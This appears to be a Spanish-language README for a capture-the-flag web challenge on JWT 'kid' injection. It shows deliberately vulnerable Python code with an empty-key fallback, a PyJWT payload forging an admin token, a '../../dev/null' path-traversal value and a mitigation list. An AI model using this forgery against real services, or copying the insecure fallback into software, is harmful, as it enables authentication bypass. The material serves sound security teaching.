# AuthCorp — JWT kid Injection

Dificultad: Insane | Categoría: Web | Técnica: JWT kid Parameter Injection

## Descripción

AuthCorp es un servicio de autenticación que emite tokens JWT. El header del JWT incluye un campo `kid` (Key ID) que indica qué archivo de clave usar para verificar la firma HMAC.

El servidor construye la ruta del archivo como `/keys/{kid}.key` y lo lee directamente desde el sistema de archivos. Si el archivo no existe, el servidor usa una clave vacía `''` como fallback.

## Vulnerabilidad

**JWT kid Injection** es una vulnerabilidad que surge cuando el parámetro `kid` del header JWT se usa sin sanitizar para construir una ruta de archivo. Un atacante puede:

1. Controlar qué archivo se usa como clave de verificación.
2. Si apunta a un archivo inexistente, la clave es vacía `''`.
3. Forjar un JWT firmado con `''` → el servidor lo acepta como válido.

Código vulnerable:

```python
kid = header.get('kid', 'default')
key_path = f'/keys/{kid}.key'
try:
    key = open(key_path).read()
except FileNotFoundError:
    key = ''   # VULNERABLE: fallback a clave vacía
```

## Objetivo

Forjar un JWT con `role=admin` firmado con clave vacía para acceder a `/admin`.

## Payload

```python
import jwt

token = jwt.encode(
    {'username': 'admin', 'role': 'admin'},
    '',                           # clave vacía
    algorithm='HS256',
    headers={'kid': 'nonexistent'}  # archivo inexistente
)
```

## Levantar el entorno

```bash
docker compose up --build
# Disponible en http://localhost:8080
```

## Ejecutar el solver

```bash
pip install requests pyjwt
python3 solve.py
```

## Variante avanzada: path traversal

Si el servidor no tiene el fallback a clave vacía pero es vulnerable a path traversal, se puede apuntar a `/dev/null` (Linux) para obtener una clave vacía de todas formas:

```json
{"kid": "../../dev/null"}
```

## Mitigación

- Validar y restringir el valor de `kid` a un conjunto conocido de identificadores (whitelist).
- Nunca usar `kid` para construir rutas de archivos directamente.
- Usar una clave fija o un almacén de claves (JWKS) con validación de `kid`.
- Nunca usar clave vacía como fallback: rechazar tokens con `kid` inválido.
